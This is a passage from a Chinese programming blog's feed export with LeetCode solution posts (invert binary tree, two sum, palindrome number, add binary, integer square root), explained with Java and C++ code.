ss[<span class="number">1</span>];</span><br><span class="line">		<span class="keyword">if</span> (domainAndTime.containsKey(domain)) &#123;</span><br><span class="line">			domainAndTime.put(domain, domainAndTime.get(domain) + time);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			domainAndTime.put(domain, time);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> index = domain.indexOf(<span class="string">"."</span>);</span><br><span class="line">		<span class="keyword">while</span> (-<span class="number">1</span> != index) &#123;</span><br><span class="line">			domain = domain.substring(index + <span class="number">1</span>, domain.length());</span><br><span class="line">			<span class="keyword">if</span> (domainAndTime.containsKey(domain)) &#123;</span><br><span class="line">				domainAndTime.put(domain, domainAndTime.get(domain) + time);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				domainAndTime.put(domain, time);</span><br><span class="line">			&#125;</span><br><span class="line">			index = domain.indexOf(<span class="string">"."</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>226. 翻转二叉树</title>
    <url>/2018/08/29/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98-27-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E9%95%9C%E5%83%8F/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>翻转一棵二叉树。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><p>输入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">     4</span><br><span class="line">   &#x2F;   \</span><br><span class="line">  2     7</span><br><span class="line"> &#x2F; \   &#x2F; \</span><br><span class="line">1   3 6   9</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">     4</span><br><span class="line">   &#x2F;   \</span><br><span class="line">  7     2</span><br><span class="line"> &#x2F; \   &#x2F; \</span><br><span class="line">9   6 3   1</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>递归</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">exchange</span><span class="params">(TreeNode root)</span></span>&#123;</span><br><span class="line">	    TreeNode node = root;</span><br><span class="line">	    <span class="keyword">if</span>(node != <span class="keyword">null</span>)&#123;</span><br><span class="line">	        TreeNode temp = node.left;</span><br><span class="line">	        node.left = node.right;</span><br><span class="line">	        node.right = temp;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125; </span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> TreeNode <span class="title">mirrorTree</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">		TreeNode node = root;</span><br><span class="line">	    </span><br><span class="line">		<span class="keyword">if</span>(root == <span class="keyword">null</span>) &#123;</span><br><span class="line">	        <span class="keyword">return</span> root;</span><br><span class="line">	    &#125;</span><br><span class="line">	    </span><br><span class="line">	    mirrorTree(node.left);</span><br><span class="line">	    mirrorTree(node.right);</span><br><span class="line">	    exchange(node);</span><br><span class="line">	    <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>二叉树</tag>
        <tag>递归</tag>
      </tags>
  </entry>
  <entry>
    <title>1.两数之和</title>
    <url>/2018/08/28/LeetCode/leetcode-000001-%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个整数数组和一个目标值，找出数组中和为目标值的两个数。</p>
<p>你可以假设每个输入只对应一种答案，且同样的元素不能被重复利用。</p>
<h3 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">给定 nums &#x3D; [2, 7, 11, 15], target &#x3D; 9</span><br><span class="line"></span><br><span class="line">因为 nums[0] + nums[1] &#x3D; 2 + 7 &#x3D; 9</span><br><span class="line">所以返回 [0, 1]</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：-暴力破解"><a href="#解法一：-暴力破解" class="headerlink" title="解法一： 暴力破解"></a>解法一： 暴力破解</h3><p>暴力破解很简单，遍历两遍列表，找到对应的元素x，和 target - x 即可。时间复杂度为O(n*n).</p>
<h4 id="java"><a href="#java" class="headerlink" title="java"></a>java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i;j &lt; nums.length;j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] + nums[j] == target) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[] &#123;i, j&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"No such value pair."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">twoSum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.<span class="built_in">size</span>();i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>;j &lt; nums.<span class="built_in">size</span>();j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[i] + nums[j] == target) &#123;</span><br><span class="line">                    result.emplace_back(i);</span><br><span class="line">                    result.emplace_back(j);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><img src="https://huhansi.github.io/images/2020-03-02-000001-bruteforce.PNG" alt="暴力破解"></p>
<h3 id="解法二：二次遍历"><a href="#解法二：二次遍历" class="headerlink" title="解法二：二次遍历"></a>解法二：二次遍历</h3><p>借助HashMap将数值和位置的关系保存起来。然后再遍历nums，判断X和target-X是否同时在HashMap中即可。时间复杂度为O(n).</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">    Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        map.put(nums[i], i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> complement = target - nums[i];</span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(complement) &amp;&amp; map.get(complement) != i) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[] &#123; i, map.get(complement) &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"No two sum solution"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="CPP-1"><a href="#CPP-1" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">twoSum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; <span class="built_in">map</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.<span class="built_in">size</span>();i++) &#123;</span><br><span class="line">            <span class="built_in">map</span>.insert(make_pair(nums[i], i));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.<span class="built_in">size</span>();i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> value = target - nums[i];</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">map</span>.<span class="built_in">find</span>(value) != <span class="built_in">map</span>.<span class="built_in">end</span>() &amp;&amp; <span class="built_in">map</span>.<span class="built_in">find</span>(value)-&gt;second != i) &#123;</span><br><span class="line">                result.emplace_back(i);</span><br><span class="line">                result.emplace_back(<span class="built_in">map</span>.<span class="built_in">find</span>(value)-&gt;second);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三：一次遍历"><a href="#解法三：一次遍历" class="headerlink" title="解法三：一次遍历"></a>解法三：一次遍历</h3><p>只遍历一次HashMap。</p>
<p>该解法是在遍历数组时，寻找target - x的值是否在HashMap中，如果未在HashMap中，则现将当前值存入，否则继续遍历。<br>拿题目<code>nums = [2, 7, 11, 15], target = 9</code>为例，当遍历到2时，target - x 为 7，7不在HashMap中，将2存入HashMap，接着遍历至7，target - 7 = 2， 此时，2 在HashMap中，完成搜索，直接返回即可。</p>
<h3 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">    Map&lt;Integer, Integer&gt; numPosition = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span>;index &lt; nums.length;index++) &#123;</span><br><span class="line">        <span class="keyword">int</span> temp = target - nums[index];</span><br><span class="line">        <span class="keyword">if</span> (numPosition.containsKey(temp) &amp;&amp; numPosition.get(temp) != index) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[] &#123;index, numPosition.get(temp)&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        numPosition.put(nums[index], index);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"No two sum solution"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP-2"><a href="#CPP-2" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">twoSum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; <span class="built_in">map</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.<span class="built_in">size</span>();i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">map</span>.<span class="built_in">find</span>(target - nums[i]) != <span class="built_in">map</span>.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                result.emplace_back(<span class="built_in">map</span>.<span class="built_in">find</span>(target - nums[i])-&gt;second);</span><br><span class="line">                result.emplace_back(i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">map</span>.insert(make_pair(nums[i], i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://huhansi.github.io/images/2020-03-02-000001-hashmap.PNG" alt="使用HashMap"></p>
<h3 id="解法四：借助数组，二次遍历"><a href="#解法四：借助数组，二次遍历" class="headerlink" title="解法四：借助数组，二次遍历"></a>解法四：借助数组，二次遍历</h3><p>首先拷贝一份数组数据，排序，然后一次遍历用头尾指针找到对应和未target的数值。最后在原nums数组中找到这两个数值的索引，返回即可。</p>
<h4 id="JAVA-1"><a href="#JAVA-1" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] copy = Arrays.copyOf(nums, nums.length);</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="keyword">int</span> last = nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> first = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (first &lt; last) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[first] + nums[last] == target) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[first] + nums[last] &gt; target) &#123;</span><br><span class="line">                last--;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[first] + nums[last] &lt; target) &#123;</span><br><span class="line">                    first++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> result1 = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> result2 = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; copy.length;i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (-<span class="number">1</span> == result1 &amp;&amp; copy[i] == nums[first]) &#123;</span><br><span class="line">                result1 = i;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (-<span class="number">1</span> == result2 &amp;&amp; copy[i] == nums[last]) &#123;</span><br><span class="line">                result2 = i;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;result1, result2&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="cpp"><a href="#cpp" class="headerlink" title="cpp"></a>cpp</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">static</span> vector&lt;<span class="keyword">int</span>&gt; *numbersCopy;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> bool <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> idx1, <span class="keyword">int</span> idx2)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (*numbersCopy)[idx1] &lt; (*numbersCopy)[idx2];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt; &amp;numbers, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        numbersCopy = &amp;numbers;</span><br><span class="line">        <span class="keyword">int</span> n = numbers.size();</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">idx</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">            idx[i] = i;</span><br><span class="line">        sort(idx.begin(), idx.end(), Solution::cmp);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> head = <span class="number">0</span>, tail = n-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(head &lt; tail)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(numbers[idx[head]] + numbers[idx[tail]] &lt; target)</span><br><span class="line">                head++;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(numbers[idx[head]] + numbers[idx[tail]] &gt; target)</span><br><span class="line">                tail--;</span><br><span class="line">            <span class="keyword">else</span> <span class="comment">//found</span></span><br><span class="line">            &#123;</span><br><span class="line">                res.push_back(min(idx[head], idx[tail]) + <span class="number">1</span>);</span><br><span class="line">                res.push_back(max(idx[head], idx[tail]) + <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt; * Solution::numbersCopy = NULL;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>9.回文数</title>
    <url>/2018/08/28/LeetCode/leetcode-000009-%E5%9B%9E%E6%96%87%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>判断一个整数是否是回文数。回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数。<br><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 121</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: -121</span><br><span class="line">输出: false</span><br><span class="line">解释: 从左向右读, 为 -121 。 从右向左读, 为 121- 。因此它不是一个回文数。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 10</span><br><span class="line">输出: false</span><br><span class="line">解释: 从右向左读, 为 01 。因此它不是一个回文数。</span><br></pre></td></tr></table></figure>
<p><strong>进阶：你能不将整数转为字符串来解决这个问题吗？</strong></p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="简单版解法"><a href="#简单版解法" class="headerlink" title="简单版解法"></a>简单版解法</h3><p>将数字转换成字符串，翻转，然后和原来的字符串比较就行。需要注意的是小于0的数字肯定不是回文数，1-9的数字肯定是回文数字。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPalindrome</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> &lt;= x &amp;&amp; x &lt; <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> StringBuffer().append(x).reverse().toString().equals(x + <span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">	    <span class="keyword">if</span>(x &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">        <span class="keyword">int</span> div = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(x / <span class="number">10</span> &gt;= div) &#123;</span><br><span class="line">            div *= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(x &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> high = x / div;</span><br><span class="line">            <span class="keyword">int</span> low = x % <span class="number">10</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(high != low) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            x = (x % div) / <span class="number">10</span>;</span><br><span class="line">            div /= <span class="number">100</span>;  </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/2020-03-02-000002-reverse.PNG" alt="Reverse"></p>
<h3 id="进阶版解法"><a href="#进阶版解法" class="headerlink" title="进阶版解法"></a>进阶版解法</h3><p>没做出来，具体解法可参见<br><a href="https://leetcode-cn.com/problems/palindrome-number/solution/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/palindrome-number/solution/</a></p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>回文</tag>
      </tags>
  </entry>
  <entry>
    <title>67.二进制求和</title>
    <url>/2018/08/28/LeetCode/leetcode-000067.%20%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%B1%82%E5%92%8C/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定两个二进制字符串，返回他们的和（用二进制表示）。</p>
<p>输入为非空字符串且只包含数字 <code>1</code> 和 <code>0</code>。</p>
<h2 id="示例一："><a href="#示例一：" class="headerlink" title="示例一："></a>示例一：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: a &#x3D; &quot;11&quot;, b &#x3D; &quot;1&quot;</span><br><span class="line">输出: &quot;100&quot;</span><br></pre></td></tr></table></figure>
<h2 id="示例二："><a href="#示例二：" class="headerlink" title="示例二："></a>示例二：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: a &#x3D; &quot;1010&quot;, b &#x3D; &quot;1011&quot;</span><br><span class="line">输出: &quot;10101&quot;</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：-新测试用例已无法通过"><a href="#解法一：-新测试用例已无法通过" class="headerlink" title="解法一：(新测试用例已无法通过)"></a>解法一：(新测试用例已无法通过)</h3><p>利用Java自带的库函数，将两个二进制的数字转换为整型，再将两个整型相加的结果转换为字符串。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">addBinary</span><span class="params">(String a, String b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> numa = Integer.valueOf(a, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> numb = Integer.valueOf(b, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> Integer.toBinaryString(numa + numb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/2020-03-02-000067-lib-func-add.PNG" alt="库函数相加"></p>
<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>字符串大数相加：</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">addBinary</span><span class="params">(String a, String b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lenA = a.length(), lenB = b.length();</span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">int</span> i = lenA - <span class="number">1</span>, j = lenB - <span class="number">1</span>, carry = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &gt;= <span class="number">0</span> || j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> sum = carry;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            sum += a.charAt(i--) - <span class="string">'0'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            sum += b.charAt(j--) - <span class="string">'0'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sb.append(sum % <span class="number">2</span>);</span><br><span class="line">        carry = sum / <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (carry != <span class="number">0</span>) &#123;</span><br><span class="line">        sb.append(carry);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sb.reverse().toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/2020-03-02-000067-big-num-add.PNG" alt="大数相加"></p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>69. x 的平方根</title>
    <url>/2018/08/28/LeetCode/leetcode-000069.%20x%20%E7%9A%84%E5%B9%B3%E6%96%B9%E6%A0%B9/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>实现 <code>int sqrt(int x)</code> 函数。</p>
<p>计算并返回 <code>x</code> 的平方根，其中 <code>x</code> 是非负整数。</p>
<p>由于返回类型是整数，结果只保留整数的部分，小数部分将被舍去。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 4</span><br><span class="line">输出: 2</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 8</span><br><span class="line">输出: 2</span><br><span class="line">说明: 8 的平方根是 2.82842..., </span><br><span class="line">     由于返回类型是整数，小数部分将被舍去。</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>使用牛顿迭代法。<br>牛顿迭代法（Newton’s method）又称为牛顿-拉夫逊（拉弗森）方法（Newton-Raphson method），它是牛顿在17世纪提出的一种在实数域和复数域上近似求解方程的方法。<br>仔细思考一下就能发现，我们需要解决的问题可以简单化理解。<br>从函数意义上理解：我们是要求函数f(x) = x²，使f(x) = num的近似解，即x² - num = 0的近似解。<br>从几何意义上理解：我们是要求抛物线g(x) = x² - num与x轴交点（g(x) = 0）最接近的点。<br>我们假设g(x0)=0，即x0是正解，那么我们要做的就是让近似解x不断逼近x0，这是函数导数的定义：</p>
<p><img src="https://huhansi.github.io/images/2020-03-02-000069-qiudaoshu.gif" alt="求导数"></p>
<p>可以由此得到</p>
